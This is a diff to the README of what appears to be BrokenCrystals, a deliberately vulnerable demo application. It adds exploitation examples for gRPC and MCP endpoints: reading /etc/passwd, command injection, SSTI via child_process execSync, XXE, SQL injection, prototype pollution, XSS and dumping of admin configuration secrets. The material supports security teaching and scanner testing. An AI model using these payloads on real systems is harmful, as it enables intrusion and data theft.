@@ -356,6 +356,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
   </details>
 
 - **Local File Inclusion (LFI)** - The /api/files endpoint returns any file on the server from the path that is provided in the _path_ param. The UI uses this endpoint to load crystal images on the landing page.
+  Additionally, the application exposes a gRPC endpoint `FileService/ReadFile` which is also vulnerable to LFI/RFI.
 
   <details>
     <summary>Example Exploitation</summary>
@@ -405,6 +406,12 @@ Full configuration & usage examples can be found in our [demo project](https://g
            # Entries added by HostAliases.
            127.0.0.1       postgres        keycloak-postgres       keycloak        nodejs  proxy   repeater        db      brokencrystals.local
            ```
+
+  3.  Accessing the `/etc/passwd` File via gRPC `FileService/ReadFile`
+
+      ```bash
+      grpcurl -plaintext -proto src/grpc/file.proto -d '{"path": "/etc/passwd"}' localhost:5000 file.FileService/ReadFile
+      ```
 
       </details>
 
@@ -492,10 +499,12 @@ Full configuration & usage examples can be found in our [demo project](https://g
     </details>
 
 - **OS Command Injection** - The /api/spawn endpoint spawns a new process using the command in the _command_ query parameter. The endpoint is not referenced from UI.
+  Additionally, the application exposes a gRPC endpoint `OsService/RunCommand` which is also vulnerable to OS Command Injection.
+
     <details>
       <summary>Example Exploitation</summary>
 
-      To demonstrate an SSTI attack, you can use the following `curl` command:
+      To demonstrate an OS Command Injection attack, you can use the following `curl` command:
 
       ```bash
       $ curl 'https://brokencrystals.com/api/spawn?command=uname%20-a'
@@ -505,6 +514,12 @@ Full configuration & usage examples can be found in our [demo project](https://g
 
       ```
       Linux brokencrystals-5b9b6759cb-66vvt 6.1.115-126.197.amzn2023.x86_64 #1 SMP PREEMPT_DYNAMIC Tue Nov  5 17:36:57 UTC 2024 x86_64 Linux
+      ```
+
+      To demonstrate the attack via gRPC:
+
+      ```bash
+      grpcurl -plaintext -proto src/grpc/os.proto -d '{"command": "id"}' localhost:5000 os.OsService/RunCommand
       ```
 
     </details>
@@ -795,6 +810,44 @@ Full configuration & usage examples can be found in our [demo project](https://g
             node:x:1000:1000::/home/node:/bin/sh
     </root>
   ```
+
+  </details>
+
+- **Hidden Upload (File Upload + XSS)** - `/hidden-upload` lets users supply a filename that is injected into the DOM without sanitization and upload images (including raw SVG) to `/api/hidden-upload`, which stores them and returns data URLs.
+
+  <details>
+    <summary>Demo of Hidden Upload XSS</summary>
+  - Go to `/hidden-upload`, set filename to `<img src=x onerror=alert(1)>`, and upload an SVG; the filename is injected as HTML and the SVG is returned as a data URL.
+
+  </details>
+
+  <details>
+    <summary>Demo of Hidden Upload File Upload</summary>
+  - Upload any image (including crafted SVG) to `/hidden-upload`; the backend stores it under `uploads/hidden` and returns a data URL without further validation of content.
+
+  </details>
+
+- **Remote File Inclusion (Safe Files)** - `/api/safe-files` fetches and returns content from user-provided URLs, enabling RFI despite minimal host allowlisting.
+
+  <details>
+    <summary>Demo of Safe Files RFI</summary>
+  - POST `{ "name": "test", "url": "https://filedealer.nexploit.app/rfi.md5.txt" }` to `/api/safe-files` to have the server fetch and return remote content.
+
+  </details>
+
+- **SQL Injection (Products Search)** - `/api/products/search?name=` interpolates the `name` parameter directly into a SQL query, allowing injection.
+
+  <details>
+    <summary>Demo of Products SQL Injection</summary>
+  - Call `/api/products/search?name=' OR 1=1 --` to dump all products due to unsanitized interpolation.
+
+  </details>
+
+- **Broken Object Property Level Authorization (BOPLA)** - `/api/users/me` GET/PUT expose and update the authenticated user object wholesale, allowing overwriting sensitive fields (including password) without proper field-level authorization.
+
+  <details>
+    <summary>Demo of /api/users/me BOPLA</summary>
+  - PUT to `/api/users/me` with `{ "password": "newpass", "isAdmin": true }` to overwrite sensitive fields for the authenticated user.
 
   </details>
 
@@ -1179,5 +1232,529 @@ Full configuration & usage examples can be found in our [demo project](https://g
     <summary>Insecure Output Handling Example</summary>
 
   ![Insecure Output Handling Demonstration](docs/insecure_output_handling.gif)
+
+  </details>
+
+- **MCP (Model Context Protocol) Vulnerabilities** - The application exposes an MCP HTTP endpoint at `/api/mcp` that implements the JSON-RPC 2.0 protocol for AI agent tool calling. This endpoint contains multiple vulnerabilities through its exposed tools and resources:
+
+  - **SQL Injection via get_count** - The `get_count` accepts a SQL query parameter and executes it directly against the database without sanitization, similar to the `/api/testimonials/count` endpoint.
+  - **Sensitive Data Exposure via get_config** - The `get_config` returns application configuration including database credentials, API keys, and cloud storage URLs.
+  - **Server-Side Template Injection via render** - The `render` accepts a custom template string that is compiled and executed using the doT template engine, allowing arbitrary code execution.
+  - **Local File Inclusion via MCP resources/read** - The `resources/read` method accepts `file://` URIs and proxies `/api/file/raw`, allowing arbitrary file reads such as `file:///etc/hosts`.
+  - **Server-Side JavaScript Injection via process_numbers** - The `process_numbers` proxies `/api/process_numbers` and executes arbitrary JavaScript from the `processing_expression` expression in server context.
+  - **XML External Entity via get_metadata** - The `get_metadata` proxies `/api/metadata` and processes attacker-controlled XML with external entities enabled (same vulnerability class as `/api/metadata`).
+  - **Broken Access Control via search_users** - The `search_users` proxies `/api/users/search/:name` and returns `application/json` search results.
+  - **Prototype Pollution via update_user** - The `update_user` tool returns top-level `name`/`email`/`username`/`phone` fields plus everything inside attacker-controlled `__proto__` payload fields.
+  - **OS Command Injection via spawn_process** - The `spawn_process` executes arbitrary operating system commands through MCP (same vulnerability class as `/api/spawn`) and streams progress over event-stream.
+  - **Authentication and Session Management** - The `/api/mcp` endpoint supports optional authentication and per-client session tracking:
+
+    - MCP sessions are independent from the regular API authentication/authorization flow.
+    - `initialize` must be called first to establish an MCP session.
+    - `initialize` returns `Mcp-Session-Id`.
+    - Every non-initialize MCP request requires an active MCP session.
+    - Every non-initialize MCP request must send the same `Mcp-Session-Id` received from `initialize`.
+    - Missing `Mcp-Session-Id` on non-initialize requests returns HTTP `400`.
+    - Unknown/expired/terminated `Mcp-Session-Id` returns HTTP `404`.
+    - Clients can explicitly terminate sessions with `DELETE /api/mcp` + `Mcp-Session-Id`.
+    - `MCP_SESSION_TTL_MS` (default: `1800000`)
+    - `initialize` works in both unauthenticated and authenticated flows.
+    - If `Authorization: Bearer <jwt>` is provided to `initialize`, the MCP session is marked authenticated.
+    - MCP permissions are role-based using the same user model as the HTTP server (`admin` vs regular user).
+    - Some tools require authenticated MCP sessions, while others are available without authentication.
+    - `get_config` is admin-only.
+    - `render` responds as `text/event-stream`:
+      `event: message` + `data: <json-rpc-payload>`.
+    - `spawn_process` responds as `text/event-stream`:
+      `event: notification` + `data: <progress-payload>` before execution and every ~5 seconds while running, partial command output via `event: notification` + `data: <partial-output-payload>`, then `event: message` + `data: <json-rpc-payload>`.
+    - `search_users` proxies `/api/users/search/:name` and returns `application/json` data.
+    - `update_user` returns top-level `name`/`email`/`username`/`phone` plus all fields from `payload.__proto__` as JSON.
+
+  - **MCP Tool/Resource List (Quick Reference)**:
+
+    _Initialize guest MCP session (required for all non-`initialize` MCP calls):_
+
+    ```bash
+    BASE='https://brokencrystals.com'
+    INIT=$(curl -i -s "${BASE}/api/mcp" -X POST \
+      -H 'Content-Type: application/json' \
+      -d '{"jsonrpc":"2.0","method":"initialize","id":1}')
+    MCP_SESSION_ID=$(echo "$INIT" | awk -F': ' 'tolower($1)=="mcp-session-id"{print $2}' | tr -d '\r')
+    ```
+
+    1. `get_count` (public)  
+       Vulnerability: **SQL Injection**.  
+       Example:
+
+       ```bash
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "tools/call",
+           "params": {
+             "name": "get_count",
+             "arguments": {
+               "query": "select count(*) as count from testimonial"
+             }
+           },
+           "id": 2
+         }'
+       ```
+
+    2. `render` (public)  
+       Vulnerability: **Server-Side Template Injection (SSTI)** via user-controlled doT template.  
+       Example:
+
+       ```bash
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "tools/call",
+           "params": {
+             "name": "render",
+             "arguments": {
+               "numbers": [1],
+               "template": "The node version is: {{=process.version}}"
+             }
+           },
+           "id": 3
+         }'
+       ```
+
+    3. `resources/list` + `resources/read` (public)  
+       Vulnerability: **Local File Inclusion (LFI)** via `file://` URI read from `/api/file/raw`.  
+       Example:
+
+       ```bash
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "resources/list",
+           "id": 4
+         }'
+
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "resources/read",
+           "params": {
+             "uri": "file:///etc/hosts"
+           },
+           "id": 5
+         }'
+       ```
+
+    4. `process_numbers` (public)  
+       Vulnerability: **Server-Side JavaScript Injection (SSJI)** via dynamic code execution.  
+       Example:
+
+       ```bash
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "tools/call",
+           "params": {
+            "name": "process_numbers",
+            "arguments": {
+              "numbers": [1, 2, 3],
+              "processing_expression": "numbers.reduce((acc, num) => acc + num, 0)"
+            }
+          },
+         "id": 6
+         }'
+       ```
+
+    5. `get_metadata` (public)  
+       Vulnerability: **XML External Entity (XXE)** via proxied `/api/metadata` XML parsing.  
+       Example:
+
+       ```bash
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "tools/call",
+           "params": {
+            "name": "get_metadata",
+            "arguments": {
+              "xml": "<root><username>John</username></root>"
+            }
+          },
+         "id": 7
+         }'
+       ```
+
+    6. `search_users` (public)  
+       Vulnerability: **Broken Access Control** via proxied user search.  
+       Example:
+
+       ```bash
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "tools/call",
+           "params": {
+            "name": "search_users",
+            "arguments": {
+              "name": "ad"
+            }
+          },
+         "id": 8
+         }'
+       ```
+
+    7. `update_user` (public)  
+       Vulnerability: **Prototype Pollution** via attacker-controlled `__proto__` object fields.  
+       Example:
+
+       ```bash
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "tools/call",
+           "params": {
+            "name": "update_user",
+            "arguments": {
+              "payload": {
+                "name": "Bob",
+                "email": "bob@example.com",
+                "role": "admin",
+                "__proto__": {
+                  "foo": "111",
+                  "status": "222"
+                }
+              }
+            }
+          },
+         "id": 9
+         }'
+       ```
+
+    8. `spawn_process` (admin only)  
+       Vulnerability: **OS Command Injection** with progress notifications over SSE.  
+       Example:
+
+       ```bash
+       curl -N "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "tools/call",
+           "params": {
+            "name": "spawn_process",
+            "arguments": {
+              "command": "ping -c 4 127.0.0.1"
+            }
+          },
+          "id": 10
+         }'
+       ```
+
+       Expected stream shape:
+
+       - `event: notification` with `status: "starting"`
+       - `event: notification` with `status: "running"` every ~5 seconds
+       - `event: notification` with method `notifications/partial_output` for stdout/stderr chunks
+       - `event: message` containing final JSON-RPC tool result
+
+    9. `get_config` (admin only)  
+       Vulnerability: **Sensitive Data Exposure** (returns app configuration including secrets when allowed).  
+       Example (admin-authenticated MCP session):
+
+       ```bash
+       AUTH_HEADERS=$(curl -i -s "${BASE}/api/auth/admin/login" -X POST \
+         -H 'Content-Type: application/json' \
+         -d '{"user":"admin","password":"admin","op":"basic"}')
+       ADMIN_AUTH=$(echo "$AUTH_HEADERS" | awk -F': ' 'tolower($1)=="authorization"{print $2}' | tr -d '\r')
+
+       ADMIN_INIT=$(curl -i -s "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Authorization: ${ADMIN_AUTH}" \
+         -d '{"jsonrpc":"2.0","method":"initialize","id":4}')
+       ADMIN_MCP_SESSION_ID=$(echo "$ADMIN_INIT" | awk -F': ' 'tolower($1)=="mcp-session-id"{print $2}' | tr -d '\r')
+
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${ADMIN_MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "tools/call",
+           "params": {
+             "name": "get_config",
+             "arguments": {
+               "include_sensitive": true
+             }
+           },
+           "id": 11
+         }'
+       ```
+
+  <details>
+    <summary>MCP Vulnerabilities Example Exploitation</summary>
+
+  _Note: Always call `initialize` first. After that, send `Mcp-Session-Id` on every MCP request. Authenticated and unauthenticated sessions are both supported._
+
+  1. **Initialize MCP session and list tools/resources**:
+
+  ```bash
+  BASE='https://brokencrystals.com'
+  INIT=$(curl -i -s "${BASE}/api/mcp" -X POST \
+    -H 'Content-Type: application/json' \
+    -d '{"jsonrpc":"2.0","method":"initialize","id":1}')
+  MCP_SESSION_ID=$(echo "$INIT" | awk -F': ' 'tolower($1)=="mcp-session-id"{print $2}' | tr -d '\r')
+
+  curl "${BASE}/api/mcp" -X POST \
+    -H 'Content-Type: application/json' \
+    -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+    -d '{"jsonrpc":"2.0","method":"tools/list","id":2}'
+
+  curl "${BASE}/api/mcp" -X POST \
+    -H 'Content-Type: application/json' \
+    -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+    -d '{"jsonrpc":"2.0","method":"resources/list","id":3}'
+  ```
+
+  2. **SQL Injection via get_count**:
+
+     ```bash
+     curl "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "tools/call",
+         "params": {
+           "name": "get_count",
+           "arguments": {
+             "query": "select count(table_name) as count from information_schema.tables"
+           }
+         },
+         "id": 2
+       }'
+     ```
+
+     Response:
+
+     ```json
+     {
+       "jsonrpc": "2.0",
+       "result": {
+         "content": [{ "type": "text", "text": "Query result: 214" }]
+       },
+       "id": 2
+     }
+     ```
+
+  3. **Sensitive Data Exposure via get_config** (admin-authenticated MCP session):
+
+     ```bash
+     AUTH_HEADERS=$(curl -i -s "${BASE}/api/auth/admin/login" -X POST \
+       -H 'Content-Type: application/json' \
+       -d '{"user":"admin","password":"admin","op":"basic"}')
+     ADMIN_AUTH=$(echo "$AUTH_HEADERS" | awk -F': ' 'tolower($1)=="authorization"{print $2}' | tr -d '\r')
+
+     ADMIN_INIT=$(curl -i -s "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Authorization: ${ADMIN_AUTH}" \
+       -d '{"jsonrpc":"2.0","method":"initialize","id":3}')
+     ADMIN_MCP_SESSION_ID=$(echo "$ADMIN_INIT" | awk -F': ' 'tolower($1)=="mcp-session-id"{print $2}' | tr -d '\r')
+
+     curl "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${ADMIN_MCP_SESSION_ID}" \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "tools/call",
+         "params": {
+           "name": "get_config",
+            "arguments": {}
+          },
+         "id": 4
+       }'
+     ```
+
+     Response:
+
+     ```json
+     {
+       "jsonrpc": "2.0",
+       "result": {
+         "content": [
+           {
+             "type": "text",
+             "text": "{\n  \"awsBucket\": \"https://neuralegion-open-bucket.s3.amazonaws.com\",\n  \"sql\": \"postgres://bc:bc@db:5432/bc\",\n  \"googlemaps\": \"AIzaSyD2wIxpYCuNI0Zjt8kChs2hLTS5abVQfRQ\"\n}"
+           }
+         ]
+       },
+       "id": 4
+     }
+     ```
+
+  4. **Local File Inclusion via resources/read**:
+
+     ```bash
+     curl "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "resources/read",
+         "params": {
+           "uri": "file:///etc/hosts"
+         },
+         "id": 5
+       }'
+     ```
+
+     This payload reads local server files through the `/api/file/raw` proxy using a `file://` URI.
+
+  5. **Server-Side JavaScript Injection via process_numbers**:
+
+     ```bash
+     curl "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "tools/call",
+         "params": {
+           "name": "process_numbers",
+           "arguments": {
+             "numbers": [1, 2, 3],
+             "processing_expression": "numbers.reduce((acc, num) => acc + num, 0)"
+           }
+         },
+         "id": 6
+       }'
+     ```
+
+     This payload executes JavaScript directly on the server.
+
+  6. **XML External Entity via get_metadata**:
+
+     ```bash
+     curl "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "tools/call",
+         "params": {
+           "name": "get_metadata",
+           "arguments": {
+             "xml": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE replace [<!ENTITY mcp_xxe SYSTEM \"file://etc/passwd\">]><root>&mcp_xxe;</root>"
+           }
+         },
+         "id": 7
+       }'
+     ```
+
+     This payload proxies XML with external entity definitions to `/api/metadata`.
+
+  7. **User Search Enumeration via search_users**:
+
+     ```bash
+     curl "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "tools/call",
+         "params": {
+           "name": "search_users",
+           "arguments": {
+             "name": "ad"
+           }
+         },
+         "id": 8
+       }'
+     ```
+
+     This payload proxies `/api/users/search/:name` and returns JSON user search results.
+
+  8. **Prototype Pollution via update_user**:
+
+     ```bash
+     curl "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "tools/call",
+         "params": {
+           "name": "update_user",
+           "arguments": {
+             "payload": {
+               "name": "Bob",
+               "email": "bob@example.com",
+               "__proto__": {
+                 "role": "admin"
+               }
+             }
+           }
+         },
+         "id": 9
+       }'
+     ```
+
+     This payload returns only top-level `name`/`email`/`username`/`phone` fields and all fields under `payload.__proto__`.
+
+  9. **OS Command Injection via spawn_process**:
+
+     ```bash
+     curl -N "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "tools/call",
+         "params": {
+           "name": "spawn_process",
+           "arguments": {
+             "command": "uname -a"
+           }
+         },
+         "id": 10
+       }'
+     ```
+
+     Response is streamed as SSE and ends with an `event: message` JSON-RPC payload containing command output.
+
+  10. **Server-Side Template Injection via render**:
+
+  ```bash
+  curl "${BASE}/api/mcp" -X POST \
+    -H 'Content-Type: application/json' \
+    -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+    -d '{
+      "jsonrpc": "2.0",
+      "method": "tools/call",
+      "params": {
+        "name": "render",
+        "arguments": {
+          "numbers": [1],
+          "template": "{{= global.process.mainModule.require('\''child_process'\'').execSync('\''ls -la'\'') }}"
+        }
+      },
+      "id": 11
+    }'
+  ```
+
+  This payload executes arbitrary system commands through the template injection vulnerability.
 
   </details>
